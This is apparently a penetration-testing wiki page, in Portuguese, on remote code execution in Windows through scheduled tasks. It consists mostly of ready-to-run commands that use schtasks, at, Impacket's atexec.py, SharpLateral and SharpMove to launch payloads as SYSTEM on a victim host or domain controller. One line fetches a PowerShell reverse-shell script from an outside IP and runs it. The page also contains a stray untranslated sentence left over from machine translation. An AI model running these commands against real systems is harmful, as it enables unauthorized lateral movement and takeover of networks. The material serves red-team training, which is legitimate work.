# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Como funciona

Com acesso administrativo a um host Windows, um operador pode criar e iniciar uma tarefa agendada remotamente. A opção `/S` seleciona o host remoto, `/U` e `/P` fornecem credenciais para criar a tarefa quando necessário, e `/RU` seleciona a conta sob a qual a tarefa será executada. O comando referenciado por `/TR` deve existir no sistema remoto.<sup>[[1]](#references)</sup>

O comando `at` mais antigo também pode agendar um comando em um host remoto quando o serviço Schedule está em execução. Ele executa tarefas agendadas usando a conta de serviço, que normalmente é `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Crie a tarefa e depois inicie-a:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Please provide the text to be translated.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Para uma tarefa semanal recorrente, use um agendamento semanal válido e especifique o dia explicitamente:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Uma ação de tarefa também pode invocar o PowerShell diretamente. O exemplo de laboratório a seguir baixa e executa um script; hospede o payload somente em uma infraestrutura autorizada para a avaliação:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
O `atexec.py` do Impacket automatiza a execução remota de comandos por meio do serviço Task Scheduler e aceita autenticação por senha, hash NTLM ou Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral fornece um método de execução de tarefas agendadas:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
O SharpMove fornece outra implementação do Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Mais informações sobre o [**uso de schtasks com silver tickets aqui**](../active-directory-methodology/silver-ticket.md#host).

Remova as tarefas de teste após o uso:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - comando `at`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
